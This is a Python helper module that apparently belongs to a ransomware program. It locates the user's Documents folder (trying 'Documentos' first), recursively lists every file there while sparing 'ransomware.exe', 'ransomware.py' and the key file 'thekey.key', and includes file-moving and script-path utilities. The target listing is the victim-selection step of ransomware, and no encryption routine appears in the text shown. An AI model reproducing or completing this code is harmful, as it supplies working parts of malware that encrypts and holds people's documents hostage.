from pathlib import Path
import os
import shutil

def get_documents_path():
    """
    Get the path to the user's documents folder.

    Returns:
        Path: The path to the documents folder.
    """
    home = Path.home()
    documents_folder = home / 'Documentos'
    if not documents_folder.exists():
        documents_folder = home / 'Documents'
    return documents_folder

def get_files(path):
    """
    Get a list of files in a directory, excluding certain files.

    Args:
        path (Path): The directory to search for files.

    Returns:
        list: List of file paths.
    """
    excluded_files = {'ransomware.exe', 'thekey.key', 'ransomware.py', 'ransomware.png'}
    files = []
    for root, _, filenames in os.walk(path):
        for file_name in filenames:
            if file_name in excluded_files:
                continue
            file_path = os.path.join(root, file_name)
            files.append(file_path)
    return files

def move_executable(file, dest_folder):
    """
    Move a file to a destination folder.

    Args:
        file (str): The file to move.
        dest_folder (str): The destination folder.
    """
    if not Path(file).exists():
        print(f'Error: source file {file} does not exist.')
        return
    if not Path(dest_folder).exists():
        print(f'Error: destination folder {dest_folder} does not exist.')
        return
    try:
        shutil.move(file, dest_folder)
        print(f'File {file} moved to {dest_folder} successfully')
    except Exception as e:
        print(f'Error while moving file: {e}')

def get_parent_folder_path():
    """
    Get the path to the folder containing the script.

    Returns:
        Path: The parent folder path.
    """
    script_path = Path(__file__).resolve()
    return script_path.parent
